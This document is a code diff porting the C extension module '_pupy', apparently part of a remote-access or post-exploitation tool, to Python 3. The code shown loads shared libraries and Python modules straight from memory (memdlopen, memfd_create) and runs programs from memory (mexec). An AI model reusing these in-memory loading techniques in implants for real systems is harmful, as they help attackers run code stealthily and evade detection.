@@ -250,7 +250,6 @@ static PyObject *Py_memfd_create(PyObject *self, PyObject *args, PyObject *kwarg
     char memfd_path[PATH_MAX] = {};
     int fd = -1;
     const char *name = "";
-    FILE *c_file;
     PyObject *py_file;
     PyObject *result;
 
@@ -269,13 +268,7 @@ static PyObject *Py_memfd_create(PyObject *self, PyObject *args, PyObject *kwarg
     if (fd == -1)
         return PyErr_SetFromErrno(PyExc_OSError);
 
-    c_file = fdopen(fd, "w+b");
-    if (!c_file) {
-        close(fd);
-        return PyErr_SetFromErrno(PyExc_OSError);
-    }
-
-    py_file = PyFile_FromFile(c_file, memfd_path, "w+b", fclose);
+    py_file = PyOpen(fd, memfd_path, "w+b", 0);
     if (!py_file) {
         close(fd);
         return NULL;
@@ -302,9 +295,10 @@ static PyObject *Py_load_dll(PyObject *self, PyObject *args)
     return PyLong_FromVoidPtr(memdlopen(dllname, lpDllBuffer, dwDllLenght, RTLD_LOCAL | RTLD_NOW));
 }
 
-bool
-import_module(const char *initfuncname, char *modname, const char *data, size_t size) {
-    char *oldcontext;
+PyObject*
+import_module(
+    PyObject *spec, const char *initfuncname, char *modname,
+        const char *data, size_t size) {
 
     dprint("import_module: init=%s mod=%s (%p:%lu)\n",
            initfuncname, modname, data, size);
@@ -312,29 +306,34 @@ import_module(const char *initfuncname, char *modname, const char *data, size_t 
     void *hmem = memdlopen(modname, data, size, RTLD_LOCAL | RTLD_NOW);
     if (!hmem) {
         dprint("Couldn't load %s: %m\n", modname);
-        return false;
+        PyErr_Format(
+            PyExc_ImportError,
+            "Couldn't load %s", modname
+        );
+
+        return NULL;
     }
 
-    void (*do_init)() = dlsym(hmem, initfuncname);
+    initfunc_t do_init = dlsym(hmem, initfuncname);
     if (!do_init) {
         dprint("Couldn't find sym %s in %s: %m\n", initfuncname, modname);
         dlclose(hmem);
-        return false;
+
+        PyErr_Format(
+            PyExc_ImportError,
+            "Could not find function %s", initfuncname
+        );
+
+        return NULL;
     }
 
-    oldcontext = _Py_PackageContext;
-    _Py_PackageContext = modname;
-    dprint("Call %s@%s (%p)\n", initfuncname, modname, do_init);
-    do_init();
-    _Py_PackageContext = oldcontext;
-
-    dprint("Call %s@%s (%p) - complete\n", initfuncname, modname, do_init);
-
-    return true;
+    return PyInit_Module(spec, modname, do_init);
 }
 
 static PyObject *
 Py_import_module(PyObject *self, PyObject *args) {
+    PyObject *spec;
+
     char *data;
     int size;
     char *initfuncname;
@@ -342,22 +341,16 @@ Py_import_module(PyObject *self, PyObject *args) {
     char *pathname;
 
     /* code, initfuncname, fqmodulename, path */
-    if (!PyArg_ParseTuple(args, "s#sss:import_module",
+    if (!PyArg_ParseTuple(args, "s#Osss:import_module",
                   &data, &size,
+                  &spec,
                   &initfuncname, &modname, &pathname)) {
         return NULL;
     }
 
     dprint("DEBUG! %s@%s\n", initfuncname, modname);
 
-    if (!import_module(initfuncname, modname, data, size)) {
-        PyErr_Format(PyExc_ImportError,
-                 "Could not find function %s", initfuncname);
-        return NULL;
-    }
-
-    /* Retrieve from sys.modules */
-    return PyImport_ImportModule(modname);
+    return import_module(spec, initfuncname, modname, data, size);
 }
 
 static PyObject *Py_mexec(PyObject *self, PyObject *args)
@@ -379,7 +372,7 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args)
 
     bool redirected = PyObject_IsTrue(redirected_obj);
     bool detach =  PyObject_IsTrue(detach_obj);
-    char **argv = (char **) malloc(sizeof(char*) * (argc + 1));
+    const char ** argv = (const char **) malloc(sizeof(char*) * (argc + 1));
     if (!argv) {
         PyErr_SetString(ExecError, "Too many args");
         return NULL;
@@ -407,13 +400,9 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args)
     PyObject * p_stderr = Py_None;
 
     if (redirected) {
-        p_stdin = PyFile_FromFile(fdopen(stdior[0], "w"), "mexec:stdin", "a", fclose);
-        p_stdout = PyFile_FromFile(fdopen(stdior[1], "r"), "mexec:stdout", "r", fclose);
-        p_stderr = PyFile_FromFile(fdopen(stdior[2], "r"), "mexec:stderr", "r", fclose);
-
-        PyFile_SetBufSize(p_stdin, 0);
-        PyFile_SetBufSize(p_stdout, 0);
-        PyFile_SetBufSize(p_stderr, 0);
+        p_stdin = PyOpen(stdior[0], "mexec:stdin", "a", 0);
+        p_stdout = PyOpen(stdior[1], "mexec:stdout", "r", 0);
+        p_stderr = PyOpen(stdior[2], "mexec:stderr", "r", 0);
     }
 
     return Py_BuildValue("i(OOO)", pid, p_stdin, p_stdout, p_stderr);
@@ -448,12 +437,36 @@ static PyMethodDef methods[] = {
     { NULL, NULL },     /* Sentinel */
 };
 
-DL_EXPORT(void)
-init_pupy(void) {
 
-    PyObject *pupy = Py_InitModule3("_pupy", methods, (char *) module_doc);
+#if PYMAJ > 2
+static struct PyModuleDef pupy_moduledef = {
+    PyModuleDef_HEAD_INIT,
+    "_pupy", module_doc, -1, methods,
+    NULL, NULL, NULL, NULL,
+};
+#endif
+
+
+#if PYMAJ > 2
+DL_EXPORT(PyObject*) PyInit__pupy(void)
+#else
+DL_EXPORT(void) init_pupy(void)
+#endif
+{
+    PyObject *pupy = NULL;
+
+#if PYMAJ > 2
+    pupy = PyModule_Create(&pupy_moduledef);
+#else
+    pupy = Py_InitModule3("_pupy", methods, (char *) module_doc);
+#endif
+
     if (!pupy) {
+#if PYMAJ > 2
+        return NULL;
+#else
         return;
+#endif
     }
 
     PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
@@ -472,5 +485,9 @@ init_pupy(void) {
 #ifndef _LD_HOOKS_NAME
     set_pathmap_callback(__pathmap_callback);
 #endif
+#endif
+
+#if PYMAJ > 2
+    return pupy;
 #endif
 }
